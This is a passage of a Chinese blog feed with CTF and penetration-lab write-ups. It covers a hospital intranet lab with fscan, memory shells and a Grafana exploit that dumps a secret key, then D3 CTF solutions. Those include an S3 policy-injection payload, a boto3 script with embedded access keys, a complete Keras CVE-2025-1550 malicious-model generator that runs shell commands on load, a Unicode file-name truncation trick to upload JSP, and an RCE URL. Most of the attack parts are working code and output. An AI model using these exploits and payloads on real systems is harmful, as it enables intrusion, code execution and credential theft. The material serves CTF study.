23:48:34] [SUCCESS] 扫描已完成: 16/16</span><br></code></pre></td></tr></table></figure><p><img src="/../hospital/1756616305163-4.png" alt="img"></p><p>代理后后访问内网</p><p>用nacos工具注入内存马后（注意加header）就能连接了</p><p><img src="/../hospital/1756616305163-5.png" alt="img"></p><p><img src="/../hospital/1756616305163-6.png" alt="img"></p><p>在冰蝎里面拿到flag2</p><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>下载bp的fastjsonscan 插件然后抓包写入哥斯拉内存马</p><p><img src="/../hospital/1756616305163-7.png" alt="img"></p><p>连入之后拿到flag3</p><p><img src="/../hospital/1756616305163-8.png" alt="img"></p><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p><img src="/../hospital/1756616305163-9.png" alt="img"></p><p>发现还有一个网卡</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs Markdown">/root &gt;./FScan<span class="hljs-emphasis">_linux_</span>x64 -h 172.30.54.179/24<br><br>┌──────────────────────────────────────────────┐<br>│    <span class="hljs-strong">___                              _        │</span><br><span class="hljs-strong">│   / _ \     __</span>_  <span class="hljs-strong">___ _ __</span> __ _  <span class="hljs-strong">__<span class="hljs-emphasis">_| | _</span>_    │</span><br><span class="hljs-strong">│  / /<span class="hljs-emphasis">_\/_</span>__</span><span class="hljs-emphasis">_/ <span class="hljs-strong">__|/ __</span>| &#x27;<span class="hljs-strong">__/ _` |/ __</span>| |/ /    │</span><br><span class="hljs-emphasis">│ / /_</span>\\<span class="hljs-strong">____</span><span class="hljs-emphasis">_\_</span>_ \ (<span class="hljs-strong">__| | | (<span class="hljs-emphasis">_| | (_</span><span class="hljs-emphasis">_|   &lt;     │</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">│ \_</span>__</span><span class="hljs-emphasis">_/     |<span class="hljs-strong">___/\__</span>_</span>|<span class="hljs-emphasis">_|  \<span class="hljs-strong">__,_|\__</span>_</span>|<span class="hljs-emphasis">_|\_</span>\    │<br>└──────────────────────────────────────────────┘<br><span class="hljs-code">      Fscan Version: 2.0.1</span><br><span class="hljs-code"></span><br>[2.3s]     已选择服务扫描模式<br>[2.3s]     开始信息扫描<br>[2.3s]     CIDR范围: 172.30.54.0-172.30.54.255<br>[2.3s]     generate<span class="hljs-emphasis">_ip_</span>range<span class="hljs-emphasis">_full</span><br><span class="hljs-emphasis">[2.3s]     解析CIDR 172.30.54.179/24 -&gt; IP范围 172.30.54.0-172.30.54.255</span><br><span class="hljs-emphasis">[2.3s]     最终有效主机数量: 256</span><br><span class="hljs-emphasis">[2.3s]     开始主机扫描</span><br><span class="hljs-emphasis">[2.3s]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle</span><br><span class="hljs-emphasis">[2.3s] [*] 目标 172.30.54.179   存活 (ICMP)</span><br><span class="hljs-emphasis">[2.3s] [*] 目标 172.30.54.12    存活 (ICMP)</span><br><span class="hljs-emphasis">[5.3s]     存活主机数量: 2</span><br><span class="hljs-emphasis">[5.3s]     有效端口数量: 233</span><br><span class="hljs-emphasis">[5.4s] [*] 端口开放 172.30.54.179:5555</span><br><span class="hljs-emphasis">[5.4s] [*] 端口开放 172.30.54.12:3000</span><br><span class="hljs-emphasis">[5.4s] [*] 端口开放 172.30.54.179:8080</span><br><span class="hljs-emphasis">[5.4s] [*] 端口开放 172.30.54.179:22</span><br><span class="hljs-emphasis">[5.4s] [*] 端口开放 172.30.54.179:8009</span><br><span class="hljs-emphasis">[5.4s] [*] 端口开放 172.30.54.12:22</span><br><span class="hljs-emphasis">[5.4s] [*] 端口开放 172.30.54.12:5432</span><br><span class="hljs-emphasis">[5.4s]     扫描完成, 发现 7 个开放端口</span><br><span class="hljs-emphasis">[5.4s]     存活端口数量: 7</span><br><span class="hljs-emphasis">[5.4s]     开始漏洞扫描</span><br><span class="hljs-emphasis">[5.6s] [*] 网站标题 http://172.30.54.12:3000  状态码:302 长度:29     标题:无标题 重定向地址: http://172.30.54.12:3000/login</span><br><span class="hljs-emphasis">[5.6s] [*] 网站标题 http://172.30.54.179:8080 状态码:200 长度:3964   标题:医院后台管理平台</span><br><span class="hljs-emphasis">[5.6s]     POC加载完成: 总共387个，成功387个，失败0个</span><br><span class="hljs-emphasis">[5.7s] [*] 网站标题 http://172.30.54.12:3000/login 状态码:200 长度:27909  标题:Grafana</span><br><span class="hljs-emphasis">[43.9s]     扫描已完成: 11/11</span><br></code></pre></td></tr></table></figure><p>新网卡扫一次</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Python">/root &gt;./linux_amd64_grafanaExp exp -u http://<span class="hljs-number">172.30</span><span class="hljs-number">.54</span><span class="hljs-number">.12</span>:<span class="hljs-number">3000</span><br><br><span class="hljs-number">2025</span>/08/<span class="hljs-number">12</span> <span class="hljs-number">22</span>:<span class="hljs-number">27</span>:<span class="hljs-number">36</span> Target vulnerable has plugin [alertlist]<br><span class="hljs-number">2025</span>/08/<span class="hljs-number">12</span> <span class="hljs-number">22</span>:<span class="hljs-number">27</span>:<span class="hljs-number">36</span> Got secret_key [SW2YcwTIb9zpOOhoPsMm]<br><span class="hljs-number">2025</span>/08/<span class="hljs-number">12</span> <span class="hljs-number">22</span>:<span class="hljs-number">27</span>:<span class="hljs-number">36</span> There are [<span class="hljs-number">1</span>] records <span class="hljs-keyword">in</span> data_source table.<br><span class="hljs-number">2025</span>/08/<span class="hljs-number">12</span> <span class="hljs-number">22</span>:<span class="hljs-number">27</span>:<span class="hljs-number">36</span> <span class="hljs-built_in">type</span>:[postgres]        name:[PostgreSQL]                url:[localhost:<span class="hljs-number">5432</span>]        user:[postgres]        password[��K�&lt;a8�aIc���rT��&lt;X]        database:[postgres]        basic_auth_user:[]        basic_auth_password:[]<br><span class="hljs-number">2025</span>/08/<span class="hljs-number">12</span> <span class="hljs-number">22</span>:<span class="hljs-number">27</span>:<span class="hljs-number">36</span> All Done, have nice day!<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>D3 CTF</title>
    <link href="/2025/06/11/D3%20CTF/"/>
    <url>/2025/06/11/D3%20CTF/</url>
    
    <content type="html"><![CDATA[<h1 id="D3-CTF"><a href="#D3-CTF" class="headerlink" title="D3 CTF"></a>D3 CTF</h1><h2 id="1-D3-invitation"><a href="#1-D3-invitation" class="headerlink" title="1.D3 invitation"></a>1.D3 invitation</h2><p>先伪造拿到jwt</p><p>payload*:{“object_name”:”#&quot;]},{&quot;Effect&quot;:&quot;Allow&quot;,&quot;Action&quot;:[&quot;s3:<em>&quot;],&quot;Resource&quot;:[&quot;arn:aws:s3:::</em>&#x2F;*”}</p><p><img src="D:\ctf\笔记\图片\image-20250604171659123.png" alt="image-20250604171659123"></p><p><img src="/%E5%9B%BE%E7%89%87/image-20250605172402599.png" alt="image-20250605172402599"></p><p><strong>2. STS 令牌策略注入</strong></p><ul><li><p><strong>场景</strong>：后端生成 STS 策略时，未过滤用户输入，导致 RAM 策略被篡改。</p></li><li><p><strong>原理</strong>：用户输入恶意字符，嵌入 RAM 策略，扩大权限范围。</p></li><li><p><strong>payload</strong>:{“object_name”:”#&quot;]},{&quot;Effect&quot;:&quot;Allow&quot;,&quot;Action&quot;:[&quot;s3:<em>&quot;],&quot;Resource&quot;:[&quot;arn:aws:s3:::</em>&#x2F;*”}</p><p>  <img src="/%E5%9B%BE%E7%89%87/image-20250605173030056.png" alt="image-20250605173030056"></p></li></ul><p>再拿着令牌去访问下载flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> boto3<br><span class="hljs-keyword">from</span> botocore.client <span class="hljs-keyword">import</span> Config<br><span class="hljs-keyword">from</span> botocore.exceptions <span class="hljs-keyword">import</span> ClientError<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">list_objects_in_bucket</span>(<span class="hljs-params">access_key, secret_key, session_token, endpoint, bucket</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;列出存储桶中的所有对象&quot;&quot;&quot;</span><br>    session = boto3.session.Session()<br>    s3 = session.client(<br>        service_name=<span class="hljs-string">&#x27;s3&#x27;</span>,<br>        endpoint_url=endpoint,<br>        aws_access_key_id=access_key,<br>        aws_secret_access_key=secret_key,<br>        aws_session_token=session_token,<br>        config=Config(signature_version=<span class="hljs-string">&#x27;s3v4&#x27;</span>),<br>        region_name=<span class="hljs-string">&#x27;us-east-1&#x27;</span><br>    )<br><br>    <span class="hljs-keyword">try</span>:<br>        response = s3.list_objects_v2(Bucket=bucket)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Contents&#x27;</span> <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;桶 &#x27;<span class="hljs-subst">&#123;bucket&#125;</span>&#x27; 中的对象列表:&quot;</span>)<br>            <span class="hljs-keyword">return</span> [obj[<span class="hljs-string">&#x27;Key&#x27;</span>] <span class="hljs-keyword">for</span> obj <span class="hljs-keyword">in</span> response[<span class="hljs-string">&#x27;Contents&#x27;</span>]]<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;桶 &#x27;<span class="hljs-subst">&#123;bucket&#125;</span>&#x27; 为空。&quot;</span>)<br>            <span class="hljs-keyword">return</span> []<br><br>    <span class="hljs-keyword">except</span> ClientError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;列出对象时出错: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> []<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download_flag_file</span>(<span class="hljs-params">access_key, secret_key, session_token, endpoint, bucket, object_name, download_path</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;下载指定对象到本地文件&quot;&quot;&quot;</span><br>    session = boto3.session.Session()<br>    s3 = session.client(<br>        service_name=<span class="hljs-string">&#x27;s3&#x27;</span>,<br>        endpoint_url=endpoint,<br>        aws_access_key_id=access_key,<br>        aws_secret_access_key=secret_key,<br>        aws_session_token=session_token,<br>        config=Config(signature_version=<span class="hljs-string">&#x27;s3v4&#x27;</span>),<br>        region_name=<span class="hljs-string">&#x27;us-east-1&#x27;</span><br>    )<br><br>    <span class="hljs-keyword">try</span>:<br>        s3.download_file(bucket, object_name, download_path)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;成功下载 <span class="hljs-subst">&#123;object_name&#125;</span> 到 <span class="hljs-subst">&#123;download_path&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> ClientError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;下载失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    access_key = <span class="hljs-string">&quot;LG3NMF8KJW6PG6SCBDKJ&quot;</span><br>    secret_key = <span class="hljs-string">&quot;E6zlKw41LzXyCZ77RD1rkDm0ZYYY+eu1ZOjWt2OG&quot;</span><br>    session_token = <span class="hljs-string">&quot;eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NLZXkiOiJMRzNOTUY4S0pXNlBHNlNDQkRLSiIsImV4cCI6MTc0OTAyOTg5OSwicGFyZW50IjoiQjlNMzIwUVhIRDM4V1VSMk1JWTMiLCJzZXNzaW9uUG9saWN5IjoiZXlKV1pYSnphVzl1SWpvaU1qQXhNaTB4TUMweE55SXNJbE4wWVhSbGJXVnVkQ0k2VzNzaVJXWm1aV04wSWpvaVFXeHNiM2NpTENKQlkzUnBiMjRpT2xzaWN6TTZSMlYwVDJKcVpXTjBJaXdpY3pNNlVIVjBUMkpxWldOMElsMHNJbEpsYzI5MWNtTmxJanBiSW1GeWJqcGhkM002Y3pNNk9qcGtNMmx1ZG1sMFlYUnBiMjR2S2lKZGZTeDdJa1ZtWm1WamRDSTZJa0ZzYkc5M0lpd2lRV04wYVc5dUlqcGJJbk16T2t4cGMzUkJiR3hOZVVKMVkydGxkSE1pWFN3aVVtVnpiM1Z5WTJVaU9sc2lLaW9pWFgwc2V5SkZabVpsWTNRaU9pSkJiR3h2ZHlJc0lrRmpkR2x2YmlJNld5SnpNenBIWlhSUFltcGxZM1FpTENKek16cFFkWFJQWW1wbFkzUWlYU3dpVW1WemIzVnlZMlVpT2xzaVlYSnVPbUYzY3pwek16bzZPbVpzWVdjdktpSmRmU3g3SWtWbVptVmpkQ0k2SWtGc2JHOTNJaXdpUVdOMGFXOXVJanBiSW5Nek9reHBjM1JDZFdOclpYUWlYU3dpVW1WemIzVnlZMlVpT2xzaVlYSnVPbUYzY3pwek16bzZPbVpzWVdjaVhYMWRmUT09In0.cJrQc8vU2lOW8RhX6Is1EqTMu0gXWl51aQ52URU4R19gfxh5Or1oOBrg7h9Wfj19MjJlgpXvJwOJXedW5m7zGQ&quot;</span><br>    endpoint = <span class="hljs-string">&quot;http://35.241.98.126:30093&quot;</span><br>    bucket = <span class="hljs-string">&quot;flag&quot;</span><br><br>    <span class="hljs-comment"># 列出桶中的对象</span><br>    objects = list_objects_in_bucket(access_key, secret_key, session_token, endpoint, bucket)<br><br>    <span class="hljs-comment"># 如果有对象，下载第一个对象</span><br>    <span class="hljs-keyword">if</span> objects:<br>        first_object = objects[<span class="hljs-number">0</span>]<br>        download_path = <span class="hljs-string">f&quot;downloaded_<span class="hljs-subst">&#123;first_object&#125;</span>&quot;</span><br>        download_flag_file(access_key, secret_key, session_token, endpoint, bucket, first_object, download_path)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;没有可下载的对象。&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="2-D3-model"><a href="#2-D3-model" class="headerlink" title="2.D3 model"></a>2.D3 model</h2><h3 id="通俗易懂解释-CVE-2025-1550：Keras-模型暗藏的-“黑客后门”"><a href="#通俗易懂解释-CVE-2025-1550：Keras-模型暗藏的-“黑客后门”" class="headerlink" title="通俗易懂解释 CVE-2025-1550：Keras 模型暗藏的 “黑客后门”"></a>通俗易懂解释 CVE-2025-1550：Keras 模型暗藏的 “黑客后门”</h3><h3 id="一、什么是-Keras-和漏洞？"><a href="#一、什么是-Keras-和漏洞？" class="headerlink" title="一、什么是 Keras 和漏洞？"></a>一、什么是 Keras 和漏洞？</h3><p>Keras 是一个常用的机器学习工具，用来创建和训练 AI 模型。就像我们用 Word 保存文档一样，Keras 会把模型保存成一个包含多个文件的 “包裹”（.keras 格式），里面有模型的 “蓝图”（config.json）、“元数据”（metadata.json）和 “训练数据”（weights.h5）。</p><p><strong>漏洞的核心问题</strong>：当 Keras 加载一个恶意构造的模型文件（甚至只是一个恶意的 JSON 文件）时，黑客可以让你的电脑执行任意恶意代码（比如删除文件、下载病毒、远程控制电脑等）。这就像你打开一个看似正常的 Word 文档，结果里面藏着一个病毒程序，一打开就自动运行了。</p><p><strong>关键点</strong>：漏洞的核心是 Keras 在反序列化模型配置时，允许动态加载任意 Python 模块并执行函数，且未对输入做安全过滤。这相当于给模型加载过程开了一个 “后门”，让恶意代码能伪装成模型配置被执行。</p><p>payload:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs lua">import zipfile<br>import json<br>from keras.models import Sequential<br>from keras.layers import Dense<br>import numpy as np<br>import <span class="hljs-built_in">os</span><br><br>model_name = <span class="hljs-string">&quot;test.keras&quot;</span><br><br>x_train = np.<span class="hljs-built_in">random</span>.rand(<span class="hljs-number">100</span>, <span class="hljs-number">28</span> * <span class="hljs-number">28</span>)<br>y_train = np.<span class="hljs-built_in">random</span>.rand(<span class="hljs-number">100</span>)<br><br>model = Sequential([Dense(<span class="hljs-number">1</span>, activation=<span class="hljs-string">&#x27;linear&#x27;</span>, input_dim=<span class="hljs-number">28</span> * <span class="hljs-number">28</span>)])<br><br>model.compile(optimizer=<span class="hljs-string">&#x27;adam&#x27;</span>, loss=<span class="hljs-string">&#x27;mse&#x27;</span>)<br>model.fit(x_train, y_train, epochs=<span class="hljs-number">5</span>)<br>model.save(model_name)<br><br>with zipfile.ZipFile(model_name, <span class="hljs-string">&quot;r&quot;</span>) as f:<br>    <span class="hljs-built_in">config</span> = json.loads(f.<span class="hljs-built_in">read</span>(<span class="hljs-string">&quot;config.json&quot;</span>).decode())<br><br><span class="hljs-built_in">config</span>[<span class="hljs-string">&quot;config&quot;</span>][<span class="hljs-string">&quot;layers&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;module&quot;</span>] = <span class="hljs-string">&quot;keras.models&quot;</span><br><span class="hljs-built_in">config</span>[<span class="hljs-string">&quot;config&quot;</span>][<span class="hljs-string">&quot;layers&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;class_name&quot;</span>] = <span class="hljs-string">&quot;Model&quot;</span><br><span class="hljs-built_in">config</span>[<span class="hljs-string">&quot;config&quot;</span>][<span class="hljs-string">&quot;layers&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;config&quot;</span>] = &#123;<br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;mvlttt&quot;</span>,<br>    <span class="hljs-string">&quot;layers&quot;</span>: [<br>        &#123;<br>            <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;mvlttt&quot;</span>,<br>            <span class="hljs-string">&quot;class_name&quot;</span>: <span class="hljs-string">&quot;function&quot;</span>,<br>            <span class="hljs-string">&quot;config&quot;</span>: <span class="hljs-string">&quot;Popen&quot;</span>,<br>            <span class="hljs-string">&quot;module&quot;</span>: <span class="hljs-string">&quot;subprocess&quot;</span>,<br>            <span class="hljs-string">&quot;inbound_nodes&quot;</span>: [&#123;<span class="hljs-string">&quot;args&quot;</span>: <span class="hljs-string">[[&quot;sh&quot;, &quot;-c&quot;,&quot;env&gt;/app/index.html&quot;]]</span>, <span class="hljs-string">&quot;kwargs&quot;</span>: &#123;<span class="hljs-string">&quot;bufsize&quot;</span>: <span class="hljs-number">-1</span>&#125;&#125;]<br>        &#125;],<br>    <span class="hljs-string">&quot;input_layers&quot;</span>: <span class="hljs-string">[[&quot;mvlttt&quot;, 0, 0]]</span>,<br>    <span class="hljs-string">&quot;output_layers&quot;</span>: <span class="hljs-string">[[&quot;mvlttt&quot;, 0, 0]]</span><br>&#125;<br><br>with zipfile.ZipFile(model_name, <span class="hljs-string">&#x27;r&#x27;</span>) as zip_read:<br>    with zipfile.ZipFile(f<span class="hljs-string">&quot;tmp.&#123;model_name&#125;&quot;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) as zip_write:<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> zip_read.infolist():<br>            <span class="hljs-keyword">if</span> item.filename != <span class="hljs-string">&quot;config.json&quot;</span>:<br>                zip_write.writestr(item, zip_read.<span class="hljs-built_in">read</span>(item.filename))<br><br><span class="hljs-built_in">os</span>.<span class="hljs-built_in">remove</span>(model_name)<br><span class="hljs-built_in">os</span>.<span class="hljs-built_in">rename</span>(f<span class="hljs-string">&quot;tmp.&#123;model_name&#125;&quot;</span>, model_name)<br><br>with zipfile.ZipFile(model_name, <span class="hljs-string">&quot;a&quot;</span>) as zf:<br>    zf.writestr(<span class="hljs-string">&quot;config.json&quot;</span>, json.dumps(<span class="hljs-built_in">config</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Malicious model ready&quot;</span>)<br></code></pre></td></tr></table></figure><p>生成模型后上传，再刷新页面即可（将环境变量输出到主页）</p><h2 id="3-D3-jtr"><a href="#3-D3-jtr" class="headerlink" title="3.D3 jtr"></a>3.D3 jtr</h2><h4 id="一、题目背景与核心问题"><a href="#一、题目背景与核心问题" class="headerlink" title="一、题目背景与核心问题"></a>一、题目背景与核心问题</h4><p>本题围绕网站备份系统的安全漏洞展开，核心难点在于：</p><ul><li>目标：上传 JSP 文件实现远程代码执行（RCE）</li><li>限制：后端对文件名有严格校验，直接上传<code>.jsp</code>后缀会被拦截</li><li>突破口：备份系统使用的<code>jtar</code>库存在文件名处理漏洞，可利用 Unicode 字符截断绕过校验</li></ul><h4 id="二、jtar-库的-Unicode-字符处理漏洞原理"><a href="#二、jtar-库的-Unicode-字符处理漏洞原理" class="headerlink" title="二、jtar 库的 Unicode 字符处理漏洞原理"></a>二、jtar 库的 Unicode 字符处理漏洞原理</h4><p><code>jtar</code>是一个 Java 实现的 tar 打包库，其核心问题出在<code>TarHeader</code>类的<code>getNameBytes</code>方法中。当处理包含 Unicode 字符的文件名时，库会将字符强制转换为字节（使用<code>(byte)</code>转换），这会导致<strong>高位字节被截断</strong>，仅保留低 8 位字节。</p><h4 id="三、Unicode-字符截断攻击的具体实现"><a href="#三、Unicode-字符截断攻击的具体实现" class="headerlink" title="三、Unicode 字符截断攻击的具体实现"></a>三、Unicode 字符截断攻击的具体实现</h4><ol><li><p><strong>字符截断原理</strong>：</p><ul><li>每个 Unicode 字符由 2 字节（或更多）表示，例如字符<code>陪</code>的 Unicode 编码为<code>U+966A</code>（十六进制）</li><li>当执行<code>(byte)&#39;陪&#39;</code>时，实际计算为<code>(byte)0x966A</code>，由于强制转换为 byte 类型，仅保留低 8 位<code>0x6A</code></li><li><code>0x6A</code>对应的 ASCII 字符正是<code>&#39;j&#39;</code>，因此<code>陪</code>在截断后变为<code>&#39;j&#39;</code></li></ul></li><li><p><strong>构造攻击文件名</strong>：</p><ul><li>示例文件名：<code>payload.陪sp</code></li><li>解析过程：<ul><li>上传时，文件名包含<code>陪</code>（<code>U+966A</code>），系统校验可能只检查可见字符或简单规则，允许上传</li><li>当使用 jtar 打包时，<code>陪</code>被截断为<code>&#39;j&#39;</code>，文件名变为<code>payload.jsp</code></li><li>恢复备份时，文件被写入 JSP 解析目录，最终以<code>.jsp</code>后缀存在，实现解析执行</li></ul></li></ul></li><li><p><strong>Unicode 字符搜索方法</strong>：</p><ul><li><p>使用用户提供的 Python 脚本可反向查找对应 ASCII 字符的 Unicode 字符</p></li><li><p>例如，查找对应<code>&#39;j&#39;</code>（ASCII 码 106，0x6A）的 Unicode 字符</p></li><li><p>查找脚本</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> unicodedata<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_search</span>(<span class="hljs-params">byte_value</span>):<br>    low_byte = byte_value &amp; <span class="hljs-number">0xFF</span><br>    candidates = []<br>    <span class="hljs-keyword">for</span> high <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x00</span>, <span class="hljs-number">0xFF</span> + <span class="hljs-number">1</span>):<br>        code_point = (high &lt;&lt; <span class="hljs-number">8</span>) | low_byte<br>        <span class="hljs-keyword">try</span>:<br>            char = <span class="hljs-built_in">chr</span>(code_point)<br>            name = unicodedata.name(char)<br>            candidates.append((<span class="hljs-string">f&quot;U+<span class="hljs-subst">&#123;code_point:04X&#125;</span>&quot;</span>, char, name))<br>        <span class="hljs-keyword">except</span> ValueError:<br>            <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">return</span> candidates<br><br>ascii_character = <span class="hljs-string">&quot;j&quot;</span>  <span class="hljs-comment"># 可替换为&quot;s&quot;或&quot;p&quot;</span><br>byte_val = <span class="hljs-built_in">ord</span>(ascii_character)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Possible original characters (<span class="hljs-subst">&#123;byte_val&#125;</span> → 0x<span class="hljs-subst">&#123;byte_val &amp; <span class="hljs-number">0xFF</span>:02X&#125;</span>):&quot;</span>)<br>results = reverse_search(byte_val)<br><span class="hljs-keyword">for</span> cp, char, name <span class="hljs-keyword">in</span> results:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;cp&#125;</span>: <span class="hljs-subst">&#123;char&#125;</span> - <span class="hljs-subst">&#123;name&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure></li></ul></li></ol><ul><li><p>脚本会列出所有低字节为<code>0x6A</code>的 Unicode 字符，如<code>U+006A</code>（’j’ 本身）、<code>U+016A</code>（’Ǫ’）、<code>U+026A</code>（’ɪ’）等，其中部分字符可能绕过上传校验。</p><p>  <strong>上传与利用备份功能</strong>：</p><ul><li><p>将构造的文件上传至系统（可能通过文件上传接口或其他方式）</p></li><li><p>利用备份功能触发 jtar 打包，文件名中的 Unicode 字符被截断为<code>.jsp</code></p></li><li><p>恢复备份时，文件被写入 JSP 解析目录</p><p>  最后访问rce</p><p>  110.42.47.146:7777&#x2F;view?page&#x3D;712ea348-98fd-497f-ab94-3af428f9e052&amp;cmd&#x3D;cat &#x2F;flag</p></li></ul></li></ul><p><img src="/%E5%9B%BE%E7%89%87/9d51446618ba51c76ec67d8d48022af.png" 